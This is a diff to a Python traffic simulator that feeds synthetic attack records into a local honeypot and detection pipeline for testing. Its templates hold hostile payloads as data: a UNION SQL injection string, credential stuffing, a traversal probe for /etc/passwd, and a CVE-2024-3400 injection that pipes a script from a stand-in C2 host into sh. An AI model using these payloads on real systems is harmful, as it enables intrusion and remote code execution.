@@ -2,14 +2,14 @@
 backend/attack_simulator.py
 
 CHIMERA Live Attack Traffic Simulator
-Continuously feeds realistic threat vectors, decoy triggers, and benign traffic
-with local timestamps into the FastAPI ingest pipeline at 1.5-second intervals.
+Continuously feeds realistic threat vectors and decoy triggers with true-randomized
+unique IP addresses into the FastAPI ingest pipeline at exactly 4-second intervals.
 """
 
 import time
 import random
 import sys
-from datetime import datetime
+from datetime import datetime, timezone
 import requests
 
 TARGET_URL = "http://127.0.0.1:8000/api/ingest"
@@ -24,26 +24,23 @@ BOLD = "\033[1m"
 DIM = "\033[2m"
 RESET = "\033[0m"
 
-# 6 diverse attacker and user source IPs
-IP_POOL = [
-    "185.220.101.42",
-    "89.248.165.74",
-    "45.155.205.88",
-    "194.26.29.112",
-    "103.203.57.18",
-    "192.168.1.105",
-]
-
-# Realistic traffic payload mixture
+# Attack payload templates across Honeypot and Gateway targets
 ATTACK_TEMPLATES = [
     {
-        "name": "SQLi Exploit (CVE-2024-SQLi-Extraction)",
-        "endpoint": "/api/v1/users?id=1",
-        "method": "GET",
-        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
-        "body": "id=1' UNION SELECT null, username, password_hash FROM users--",
-        "anomaly_score": 0.94,
-        "attack_type": "SQL Injection (UNION-based Extraction)",
+        "name": "Decoy Honeypot Trap (/decoy/db-admin)",
+        "endpoint": "/decoy/db-admin",
+        "method": "POST",
+        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+        "body": "SELECT * FROM chimera_admin_credentials;",
+        "attack_type": "Honeypot Trap Interaction",
+    },
+    {
+        "name": "Decoy SSH Honeypot (/decoy/ssh-login)",
+        "endpoint": "/decoy/ssh-login",
+        "method": "POST",
+        "headers": {"user-agent": "libssh/0.9.6"},
+        "body": '{"username": "root", "key": "ssh-rsa AAAAB3NzaC1yc2E..."}',
+        "attack_type": "Decoy SSH Interaction",
     },
     {
         "name": "SSH / Auth Credential Stuffing",
@@ -51,17 +48,7 @@ ATTACK_TEMPLATES = [
         "method": "POST",
         "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
         "body": '{"username": "admin", "password": "Password123!"}',
-        "anomaly_score": 0.88,
         "attack_type": "Credential Stuffing Campaign",
-    },
-    {
-        "name": "Decoy Honeypot Trap (/decoy/db-admin)",
-        "endpoint": "/decoy/db-admin",
-        "method": "POST",
-        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
-        "body": "SELECT * FROM chimera_admin_credentials;",
-        "anomaly_score": 0.96,
-        "attack_type": "Honeypot Trap Interaction",
     },
     {
         "name": "PAN-OS RCE Exploit (CVE-2024-3400)",
@@ -69,8 +56,15 @@ ATTACK_TEMPLATES = [
         "method": "POST",
         "headers": {"user-agent": "curl/8.5.0"},
         "body": "COOKIE: `curl http://c2.malicious.net/shell.sh | sh`",
-        "anomaly_score": 0.99,
         "attack_type": "PAN-OS Command Injection (CVE-2024-3400)",
+    },
+    {
+        "name": "SQLi Exploit (CVE-2024-SQLi-Extraction)",
+        "endpoint": "/api/v1/users?id=1",
+        "method": "GET",
+        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
+        "body": "id=1' UNION SELECT null, username, password_hash FROM users--",
+        "attack_type": "SQL Injection (UNION-based Extraction)",
     },
     {
         "name": "Directory Traversal / LFI (/etc/passwd)",
@@ -78,26 +72,23 @@ ATTACK_TEMPLATES = [
         "method": "GET",
         "headers": {"user-agent": "curl/8.5.0"},
         "body": "",
-        "anomaly_score": 0.91,
         "attack_type": "Directory Traversal / LFI",
     },
     {
-        "name": "Benign Telemetry (API Metrics Ping)",
-        "endpoint": "/metrics",
+        "name": "Admin Portal Recon (/admin/config)",
+        "endpoint": "/admin/config",
         "method": "GET",
-        "headers": {"user-agent": "Prometheus/2.45.0"},
+        "headers": {"user-agent": "Go-http-client/1.1"},
         "body": "",
-        "anomaly_score": 0.08,
-        "attack_type": "Normal Metrics Polling",
+        "attack_type": "Admin Surface Enumeration",
     },
     {
-        "name": "Benign User Traffic (Product Search)",
-        "endpoint": "/api/v1/products?category=electronics",
+        "name": "API Telemetry Recon (/metrics)",
+        "endpoint": "/metrics",
         "method": "GET",
-        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0"},
+        "headers": {"user-agent": "curl/8.5.0"},
         "body": "",
-        "anomaly_score": 0.12,
-        "attack_type": "Benign User Query",
+        "attack_type": "Internal Reconnaissance & Metrics Probe",
     },
 ]
 
@@ -106,40 +97,54 @@ def run_simulator():
     print(f"\n{BOLD}{'=' * 80}{RESET}")
     print(f"{BOLD}{CYAN}  🔥 CHIMERA CONTINUOUS ATTACK SIMULATOR & TELEMETRY INJECTOR 🔥{RESET}")
     print(f"{DIM}  Target Endpoint : {TARGET_URL}{RESET}")
-    print(f"{DIM}  Interval        : 1.5 seconds (Local Time Timestamps){RESET}")
+    print(f"{DIM}  Interval        : Exactly 4 seconds (Local Time Timestamps){RESET}")
+    print(f"{DIM}  IP Generation   : True Random Unique IPv4 addresses{RESET}")
     print(f"{BOLD}{'=' * 80}{RESET}\n")
 
     counter = 0
 
     while True:
         counter += 1
+
+        # True randomized unique IP generation for every single attack
+        source_ip = f"{random.randint(11,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+
         template = random.choice(ATTACK_TEMPLATES)
-        source_ip = random.choice(IP_POOL)
+        attack_name = template["name"]
+        endpoint = template["endpoint"]
+        method = template["method"]
+        headers = template["headers"]
+        body = template["body"]
+        attack_type = template["attack_type"]
+
+        now_dt = datetime.now(timezone.utc)
+        now_iso = now_dt.isoformat()
         local_time_str = datetime.now().strftime("%H:%M:%S")
+
+        # Dynamic risk score
+        random_score = round(random.uniform(0.65, 0.98), 2)
 
         payload = {
             "source_ip": source_ip,
             "destination_ip": "10.0.0.5",
-            "endpoint": template["endpoint"],
-            "method": template["method"],
-            "headers": template["headers"],
-            "body": template["body"],
-            "timestamp": local_time_str,
-            "anomaly_score": template["anomaly_score"],
-            "attack_type": template["attack_type"],
+            "endpoint": endpoint,
+            "method": method,
+            "headers": headers,
+            "body": body,
+            "timestamp": now_iso,
+            "anomaly_score": random_score,
+            "risk_score": random_score,
+            "attack_type": attack_type,
         }
 
-        attack_name = template["name"]
-        endpoint = template["endpoint"]
-
         try:
-            response = requests.post(TARGET_URL, json=payload, timeout=4)
+            response = requests.post(TARGET_URL, json=payload, timeout=15)
             status_code = response.status_code
 
             if status_code == 200:
                 data = response.json()
                 action = str(data.get("action", "unknown")).upper()
-                risk_score = float(data.get("risk_score", template["anomaly_score"]))
+                risk_score = float(data.get("risk_score", random_score))
                 event_id = str(data.get("event_id", ""))[:8]
 
                 if action in ("ESCALATED", "APPROVAL_REQ", "DECEPTION_ACTIVE"):
@@ -179,7 +184,7 @@ def run_simulator():
                 f"{RED}[ERROR]{RESET} {exc}"
             )
 
-        time.sleep(1.5)
+        time.sleep(4)
 
 
 if __name__ == "__main__":
